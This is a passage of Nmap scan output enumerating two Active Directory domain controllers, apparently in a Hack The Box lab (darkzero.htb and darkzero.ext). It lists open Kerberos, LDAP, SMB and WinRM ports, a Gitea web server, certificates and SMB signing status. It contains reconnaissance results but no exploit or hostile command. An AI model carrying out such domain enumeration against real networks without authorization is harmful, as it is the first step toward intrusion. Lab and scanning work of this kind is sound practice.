| MjEwNjA1MjEyMTM2MzhaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQDvXTQJY+f46ZITlXa/MZDJlYx4kjoBgeRvDDubNz7UWYBseICT8VPRW61vXqml
| MOo/0bn1De6zJyk4v2xUIihpa6phXL3A0ZEll14FOvvfFLqfh7buBQ3zyPYHE02f
| JinmRMXmxd/xa1A7dAr9us+xGGMgDzAPrklbWb4EZRW0cQ8AJFxSrRO8HP40yONi
| 2nQ+sx3eDQIK7csicQ8WQpX9c8wjkgYlwspP2gfHJhQHGgVHNZfjB+kq41FJ/tka
| 76CSt3OeP54zoOfD+7s9qnTIwjgvU02jhgVypV8YxHDVez9Jfj9hOoWv8IERBltR
| Z3Fk3Gy+MA13DPM8/gyyLE1FAgMBAAGjggMlMIIDITA3BgkrBgEEAYI3FQcEKjAo
| BiArBgEEAYI3FQiClcRDgYXaNIG1lSvTgmWH0aIWgXcBIQIBbgIBADAyBgNVHSUE
| KzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYB
| BQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBRA6wDqJanV
| fJUMb/1LD1JELkumjTAfBgNVHSMEGDAWgBQo81NdtPHlIZgCM/J3Rnbb28hrXTCB
| zwYDVR0fBIHHMIHEMIHBoIG+oIG7hoG4bGRhcDovLy9DTj1kYXJremVyby1EQzAx
| LUNBKDEpLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3plcm8sREM9aHRi
| P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
| aXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAC
| hoGjbGRhcDovLy9DTj1kYXJremVyby1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMl
| MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
| PWRhcmt6ZXJvLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA3BgNVHREBAf8ELTArghFEQzAxLmRhcmt6
| ZXJvLmh0YoIMZGFya3plcm8uaHRigghkYXJremVybzBPBgkrBgEEAYI3GQIEQjBA
| oD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMjg5OTE5NTQxMC0xODQ4NTI0Nzgz
| LTE1NDc3Njg1MTUtMTAwMDANBgkqhkiG9w0BAQsFAAOCAgEAJ76Bhk94n5s9KjOE
| WmxagrhYZhs6z4PiZacSd5BGHN+thY0IAfwjXE3E/gq81XIkCYFmhz5eg+FtTu4v
| dhU8uOH2l4JKVRCqLtcxcrZGV+9KdFeuhq+x6OJlKrQqYkXtz8NPeliJmFcs+3Mx
| jLWumwt4Nsb9Y7yBq1H8gmY1T+AvYPg2AsxrlsFx2vqhpHm4CtceMGgUyxTYC11u
| OG8ylsWnKJqG9paFIJeg95xL0DSgawpUyQowcJcDhT9m3ZrFn1sa+TtCk0+RM9cf
| DRO+jYpDH+q7sodGYOHSkEBEu+mQa/0sYYkQP3rBk51zMiUepdwjJ36eSuDnm03/
| jWlpxqfltCgV26GL5wsD2K57Sb1siaaiIHHLUmW9dO4/Dp1K1mBJ7VC3DMgaF30L
| aZwd4oKz/5W1WBsW7NnEdpyGqCp0bZUNFiq0SF91CS6ZeGr1UFINNuajk6Nwzb8z
| 3MwUfX0JW0T7X6xH7ygpysyafsBdJ1SHfUgYo2a31nVFaSU0avANSxUhYTdkZOby
| Y7+fLYx7n3SFg3W3bwBSOJHo7g+0pwnKnOvtijBcnBrXX7LRW9o6EpiZizoyGVFB
| Srw4WlVzxzuTq36NkBAc7uZxLA4xrX7COpJ5ct2RjholE36oCit7ou8QbhHueHRC
| v8DzcN0TVtP72F9vQB/0t2ppu9w=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-31T21:17:22
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22330/tcp): CLEAN (Timeout)
|   Check 2 (port 36640/tcp): CLEAN (Timeout)
|   Check 3 (port 28117/udp): CLEAN (Timeout)
|   Check 4 (port 2826/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:f4:7c:00 (Microsoft)
| Names:
|   DC01<20>             Flags: <unique><active>
|   DC01<00>             Flags: <unique><active>
|   DARKZERO<00>         Flags: <group><active>
|   DARKZERO<1c>         Flags: <group><active>
|   DARKZERO<1b>         Flags: <unique><conflict><active>
| Statistics:
|   00 15 5d f4 7c 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00

Nmap scan report for DC02.darkzero.ext (172.16.20.2)
Host is up, received reset ttl 64 (0.0041s latency).
Scanned at 2026-07-31 10:14:35 EDT for 217s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON         VERSION
53/tcp   open  domain        syn-ack ttl 64 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2026-07-31 21:16:36Z)
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Issuer: commonName=darkzero-ext-DC02-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:43:06
| Not valid after:  2106-05-21T21:43:06
| MD5:     f16d 1a1a 3ba4 e68a 4b8f d125 7bcd 32ab
| SHA-1:   d325 c32b f34b fbbb 9ec6 f039 cd87 d5ed f486 1304
| SHA-256: 0be9 d013 d0d3 655b 8262 884d 862f 7d91 a280 9b27 3a08 a3e1 d595 1ecc 35f0 8188
| -----BEGIN CERTIFICATE-----
| MIIHETCCBPmgAwIBAgITWgAAAAhdKxQJrJDX9wABAAAACDANBgkqhkiG9w0BAQsF
| ADBOMRMwEQYKCZImiZPyLGQBGRYDZXh0MRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xHTAbBgNVBAMTFGRhcmt6ZXJvLWV4dC1EQzAyLUNBMCAXDTI2MDUyMTIxNDMw
| NloYDzIxMDYwNTIxMjE0MzA2WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
| CgKCAQEAoV4/9qDvW1RxpiUfIrv5JTJbQ+h/LUfPXvgzrpDjXkjZh2Beaerb4pIW
| sUkueVQ0hU1rZGJSiEzI49GXYX8UNvk8vnmYteu//+pW+tGlm5UjXi74edXJlvHx
| LNMBI4lJJe8E8zEtGOXLc0cPIFgqkzykQjDw09ciEsk9BvJEupOaH1xpCHJHLr91
| GhY9pEHxTuLsg5zZiR2h9bIDyqPk+AI2i1/z8sZNgYphzPe34xQFb66V1zvQdusK
| KTdtGeSh7PoPzRpFTSaCcuGH5kDyhwQNOa+8mFn84gL5e9BH02/i0ueH33y3MMBf
| WUyp7QQJ1caivdPRJGmcGxBUGDHKBQIDAQABo4IDMjCCAy4wOAYJKwYBBAGCNxUH
| BCswKQYhKwYBBAGCNxUIgZqgJ4Oi0QmC0ZMvhPTPPYfGvz6BNwEhAgFuAgEAMDIG
| A1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQID
| BTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAK
| BggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFG4F
| nswl860RqZSjfiXagxXIVq6GMB8GA1UdIwQYMBaAFKegUTNUiJO5xwp5S51viw02
| YZ8VMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NOPWRhcmt6ZXJv
| LWV4dC1EQzAyLUNBKDEpLENOPURDMDIsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3pl
| cm8sREM9ZXh0P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBxwYIKwYBBQUHAQEEgbowgbcwgbQG
| CCsGAQUFBzAChoGnbGRhcDovLy9DTj1kYXJremVyby1leHQtREMwMi1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1leHQ/Y0FDZXJ0aWZpY2F0ZT9iYXNl
| P29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RAQH/BDEw
| L4IRREMwMi5kYXJremVyby5leHSCDGRhcmt6ZXJvLmV4dIIMZGFya3plcm8tZXh0
| ME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0yMS0yODUw
| NzgzNzU4LTEyMzEyNDQ2NTgtMjA1MTg1NzUyOS0xMDAwMA0GCSqGSIb3DQEBCwUA
| A4ICAQCIPmxCJV8UzSiPdev2pepckCtCiJJ+TVM34OgctdDcIhxRFTQsVYy/NUwt
| zmFVCk0LF4Y6RjdHoWA5psfJvokIbNWreTX5fh+ILUZFoj5TqrulxUFHRX1qUV6R
| po/e1kzcPQytvmGO+Xvbk5TP0IdnGx4y0EPA3bhCNjrSl6mLVCz+NbEP7iSI12y6
| gyJyeAoe2cGCHvDJZcvuZkGnEF8Puuo6cUAYFrcAsugrAo5ErVlO03utb8m3nv/i
| exHLDgrXO2O/ogryWV0SluB9dW8juQplA+PV8SLPSmCrH60KhujsT4tmjNC0hUCR
| AlwUax6C2XSlFKYdDKNeuK5bfhYg3Ep9bOgC6Pk5vDaCUlK7aEmQgpxSZrzCx3AU
| tIEbvBi94DbVSElqzCsmHNh25HPO63lqGRNM1xTF77jDVMYwB6m7MCUM1zOQ4r6K
| wt2kyjWcKiolQWMHls++tv6AFBIdT0XQJGHUEZuXZYAyLw1UDpQaOMti/rHNU1gE
| 2xu55SvNd04SmjMiKXBVTLfflPmr0cGveQipd9LoRqVzU4UiMi+F/4xmX+LPHRmh
| LJMMxjGoT/IPuxFSY2F547C+yvi6WNuP04FcChgT1BbHqwr+avAn7NFnx/FZBRgz
| D5DrluDUkGZfR0XCjzbPTvmUmJOk1ffucIn0zcf/KFN2SxlrJw==
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 64
464/tcp  open  kpasswd5?     syn-ack ttl 64
593/tcp  open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Issuer: commonName=darkzero-ext-DC02-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:43:06
| Not valid after:  2106-05-21T21:43:06
| MD5:     f16d 1a1a 3ba4 e68a 4b8f d125 7bcd 32ab
| SHA-1:   d325 c32b f34b fbbb 9ec6 f039 cd87 d5ed f486 1304
| SHA-256: 0be9 d013 d0d3 655b 8262 884d 862f 7d91 a280 9b27 3a08 a3e1 d595 1ecc 35f0 8188
| -----BEGIN CERTIFICATE-----
| MIIHETCCBPmgAwIBAgITWgAAAAhdKxQJrJDX9wABAAAACDANBgkqhkiG9w0BAQsF
| ADBOMRMwEQYKCZImiZPyLGQBGRYDZXh0MRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xHTAbBgNVBAMTFGRhcmt6ZXJvLWV4dC1EQzAyLUNBMCAXDTI2MDUyMTIxNDMw
| NloYDzIxMDYwNTIxMjE0MzA2WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
| CgKCAQEAoV4/9qDvW1RxpiUfIrv5JTJbQ+h/LUfPXvgzrpDjXkjZh2Beaerb4pIW
| sUkueVQ0hU1rZGJSiEzI49GXYX8UNvk8vnmYteu//+pW+tGlm5UjXi74edXJlvHx
| LNMBI4lJJe8E8zEtGOXLc0cPIFgqkzykQjDw09ciEsk9BvJEupOaH1xpCHJHLr91
| GhY9pEHxTuLsg5zZiR2h9bIDyqPk+AI2i1/z8sZNgYphzPe34xQFb66V1zvQdusK
| KTdtGeSh7PoPzRpFTSaCcuGH5kDyhwQNOa+8mFn84gL5e9BH02/i0ueH33y3MMBf
| WUyp7QQJ1caivdPRJGmcGxBUGDHKBQIDAQABo4IDMjCCAy4wOAYJKwYBBAGCNxUH
| BCswKQYhKwYBBAGCNxUIgZqgJ4Oi0QmC0ZMvhPTPPYfGvz6BNwEhAgFuAgEAMDIG
| A1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQID
| BTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAK
| BggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFG4F
| nswl860RqZSjfiXagxXIVq6GMB8GA1UdIwQYMBaAFKegUTNUiJO5xwp5S51viw02
| YZ8VMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NOPWRhcmt6ZXJv
| LWV4dC1EQzAyLUNBKDEpLENOPURDMDIsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3pl
| cm8sREM9ZXh0P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBxwYIKwYBBQUHAQEEgbowgbcwgbQG
| CCsGAQUFBzAChoGnbGRhcDovLy9DTj1kYXJremVyby1leHQtREMwMi1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1leHQ/Y0FDZXJ0aWZpY2F0ZT9iYXNl
| P29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RAQH/BDEw
| L4IRREMwMi5kYXJremVyby5leHSCDGRhcmt6ZXJvLmV4dIIMZGFya3plcm8tZXh0
| ME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0yMS0yODUw
| NzgzNzU4LTEyMzEyNDQ2NTgtMjA1MTg1NzUyOS0xMDAwMA0GCSqGSIb3DQEBCwUA
| A4ICAQCIPmxCJV8UzSiPdev2pepckCtCiJJ+TVM34OgctdDcIhxRFTQsVYy/NUwt
| zmFVCk0LF4Y6RjdHoWA5psfJvokIbNWreTX5fh+ILUZFoj5TqrulxUFHRX1qUV6R
| po/e1kzcPQytvmGO+Xvbk5TP0IdnGx4y0EPA3bhCNjrSl6mLVCz+NbEP7iSI12y6
| gyJyeAoe2cGCHvDJZcvuZkGnEF8Puuo6cUAYFrcAsugrAo5ErVlO03utb8m3nv/i
| exHLDgrXO2O/ogryWV0SluB9dW8juQplA+PV8SLPSmCrH60KhujsT4tmjNC0hUCR
| AlwUax6C2XSlFKYdDKNeuK5bfhYg3Ep9bOgC6Pk5vDaCUlK7aEmQgpxSZrzCx3AU
| tIEbvBi94DbVSElqzCsmHNh25HPO63lqGRNM1xTF77jDVMYwB6m7MCUM1zOQ4r6K
| wt2kyjWcKiolQWMHls++tv6AFBIdT0XQJGHUEZuXZYAyLw1UDpQaOMti/rHNU1gE
| 2xu55SvNd04SmjMiKXBVTLfflPmr0cGveQipd9LoRqVzU4UiMi+F/4xmX+LPHRmh
| LJMMxjGoT/IPuxFSY2F547C+yvi6WNuP04FcChgT1BbHqwr+avAn7NFnx/FZBRgz
| D5DrluDUkGZfR0XCjzbPTvmUmJOk1ffucIn0zcf/KFN2SxlrJw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3000/tcp open  http          syn-ack ttl 64 Golang net/http server
|_http-favicon: Unknown favicon MD5: E90D8DFFBA444C7F6211E99D678E5CB2
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=55fbb058fd817a2a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=8uxnW_lYGOAouMnpZ9_vUfG6E5E6MTc4NTUzMjYwMjM4NjY1NDEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 31 Jul 2026 21:16:42 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLmRhcmt6ZXJvLmV4dDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vZ2l0ZWEuZGFya3plcm8uZXh0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=f0625eb29d599d1b; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=T-ElSfA6WOO4Nnyxr86EKsOCMhA6MTc4NTUzMjYwMjUzNDYwODAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 31 Jul 2026 21:16:42 GMT
|_    Content-Length: 0
|_http-title: Gitea: Git with a cup of tea
| http-methods: 
|_  Supported Methods: HEAD GET
3268/tcp open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Issuer: commonName=darkzero-ext-DC02-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:43:06
| Not valid after:  2106-05-21T21:43:06
| MD5:     f16d 1a1a 3ba4 e68a 4b8f d125 7bcd 32ab
| SHA-1:   d325 c32b f34b fbbb 9ec6 f039 cd87 d5ed f486 1304
| SHA-256: 0be9 d013 d0d3 655b 8262 884d 862f 7d91 a280 9b27 3a08 a3e1 d595 1ecc 35f0 8188
| -----BEGIN CERTIFICATE-----
| MIIHETCCBPmgAwIBAgITWgAAAAhdKxQJrJDX9wABAAAACDANBgkqhkiG9w0BAQsF
| ADBOMRMwEQYKCZImiZPyLGQBGRYDZXh0MRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xHTAbBgNVBAMTFGRhcmt6ZXJvLWV4dC1EQzAyLUNBMCAXDTI2MDUyMTIxNDMw
| NloYDzIxMDYwNTIxMjE0MzA2WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
| CgKCAQEAoV4/9qDvW1RxpiUfIrv5JTJbQ+h/LUfPXvgzrpDjXkjZh2Beaerb4pIW
| sUkueVQ0hU1rZGJSiEzI49GXYX8UNvk8vnmYteu//+pW+tGlm5UjXi74edXJlvHx
| LNMBI4lJJe8E8zEtGOXLc0cPIFgqkzykQjDw09ciEsk9BvJEupOaH1xpCHJHLr91
| GhY9pEHxTuLsg5zZiR2h9bIDyqPk+AI2i1/z8sZNgYphzPe34xQFb66V1zvQdusK
| KTdtGeSh7PoPzRpFTSaCcuGH5kDyhwQNOa+8mFn84gL5e9BH02/i0ueH33y3MMBf
| WUyp7QQJ1caivdPRJGmcGxBUGDHKBQIDAQABo4IDMjCCAy4wOAYJKwYBBAGCNxUH
| BCswKQYhKwYBBAGCNxUIgZqgJ4Oi0QmC0ZMvhPTPPYfGvz6BNwEhAgFuAgEAMDIG
| A1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQID
| BTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAK
| BggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFG4F
| nswl860RqZSjfiXagxXIVq6GMB8GA1UdIwQYMBaAFKegUTNUiJO5xwp5S51viw02
| YZ8VMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NOPWRhcmt6ZXJv
| LWV4dC1EQzAyLUNBKDEpLENOPURDMDIsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3pl
| cm8sREM9ZXh0P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBxwYIKwYBBQUHAQEEgbowgbcwgbQG
| CCsGAQUFBzAChoGnbGRhcDovLy9DTj1kYXJremVyby1leHQtREMwMi1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1leHQ/Y0FDZXJ0aWZpY2F0ZT9iYXNl
| P29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RAQH/BDEw
| L4IRREMwMi5kYXJremVyby5leHSCDGRhcmt6ZXJvLmV4dIIMZGFya3plcm8tZXh0
| ME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0yMS0yODUw
| NzgzNzU4LTEyMzEyNDQ2NTgtMjA1MTg1NzUyOS0xMDAwMA0GCSqGSIb3DQEBCwUA
| A4ICAQCIPmxCJV8UzSiPdev2pepckCtCiJJ+TVM34OgctdDcIhxRFTQsVYy/NUwt
| zmFVCk0LF4Y6RjdHoWA5psfJvokIbNWreTX5fh+ILUZFoj5TqrulxUFHRX1qUV6R
| po/e1kzcPQytvmGO+Xvbk5TP0IdnGx4y0EPA3bhCNjrSl6mLVCz+NbEP7iSI12y6
| gyJyeAoe2cGCHvDJZcvuZkGnEF8Puuo6cUAYFrcAsugrAo5ErVlO03utb8m3nv/i
| exHLDgrXO2O/ogryWV0SluB9dW8juQplA+PV8SLPSmCrH60KhujsT4tmjNC0hUCR
| AlwUax6C2XSlFKYdDKNeuK5bfhYg3Ep9bOgC6Pk5vDaCUlK7aEmQgpxSZrzCx3AU
| tIEbvBi94DbVSElqzCsmHNh25HPO63lqGRNM1xTF77jDVMYwB6m7MCUM1zOQ4r6K
| wt2kyjWcKiolQWMHls++tv6AFBIdT0XQJGHUEZuXZYAyLw1UDpQaOMti/rHNU1gE
| 2xu55SvNd04SmjMiKXBVTLfflPmr0cGveQipd9LoRqVzU4UiMi+F/4xmX+LPHRmh
| LJMMxjGoT/IPuxFSY2F547C+yvi6WNuP04FcChgT1BbHqwr+avAn7NFnx/FZBRgz
| D5DrluDUkGZfR0XCjzbPTvmUmJOk1ffucIn0zcf/KFN2SxlrJw==
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.ext, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Issuer: commonName=darkzero-ext-DC02-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:43:06
| Not valid after:  2106-05-21T21:43:06
| MD5:     f16d 1a1a 3ba4 e68a 4b8f d125 7bcd 32ab
| SHA-1:   d325 c32b f34b fbbb 9ec6 f039 cd87 d5ed f486 1304
| SHA-256: 0be9 d013 d0d3 655b 8262 884d 862f 7d91 a280 9b27 3a08 a3e1 d595 1ecc 35f0 8188
| -----BEGIN CERTIFICATE-----
| MIIHETCCBPmgAwIBAgITWgAAAAhdKxQJrJDX9wABAAAACDANBgkqhkiG9w0BAQsF
| ADBOMRMwEQYKCZImiZPyLGQBGRYDZXh0MRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xHTAbBgNVBAMTFGRhcmt6ZXJvLWV4dC1EQzAyLUNBMCAXDTI2MDUyMTIxNDMw
| NloYDzIxMDYwNTIxMjE0MzA2WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
| CgKCAQEAoV4/9qDvW1RxpiUfIrv5JTJbQ+h/LUfPXvgzrpDjXkjZh2Beaerb4pIW
| sUkueVQ0hU1rZGJSiEzI49GXYX8UNvk8vnmYteu//+pW+tGlm5UjXi74edXJlvHx
| LNMBI4lJJe8E8zEtGOXLc0cPIFgqkzykQjDw09ciEsk9BvJEupOaH1xpCHJHLr91
| GhY9pEHxTuLsg5zZiR2h9bIDyqPk+AI2i1/z8sZNgYphzPe34xQFb66V1zvQdusK
| KTdtGeSh7PoPzRpFTSaCcuGH5kDyhwQNOa+8mFn84gL5e9BH02/i0ueH33y3MMBf
| WUyp7QQJ1caivdPRJGmcGxBUGDHKBQIDAQABo4IDMjCCAy4wOAYJKwYBBAGCNxUH
| BCswKQYhKwYBBAGCNxUIgZqgJ4Oi0QmC0ZMvhPTPPYfGvz6BNwEhAgFuAgEAMDIG
| A1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQID
| BTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAK
| BggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFG4F
| nswl860RqZSjfiXagxXIVq6GMB8GA1UdIwQYMBaAFKegUTNUiJO5xwp5S51viw02
| YZ8VMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NOPWRhcmt6ZXJv
| LWV4dC1EQzAyLUNBKDEpLENOPURDMDIsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3pl
| cm8sREM9ZXh0P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
| bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBxwYIKwYBBQUHAQEEgbowgbcwgbQG
| CCsGAQUFBzAChoGnbGRhcDovLy9DTj1kYXJremVyby1leHQtREMwMi1DQSxDTj1B
| SUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
| ZmlndXJhdGlvbixEQz1kYXJremVybyxEQz1leHQ/Y0FDZXJ0aWZpY2F0ZT9iYXNl
| P29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOwYDVR0RAQH/BDEw
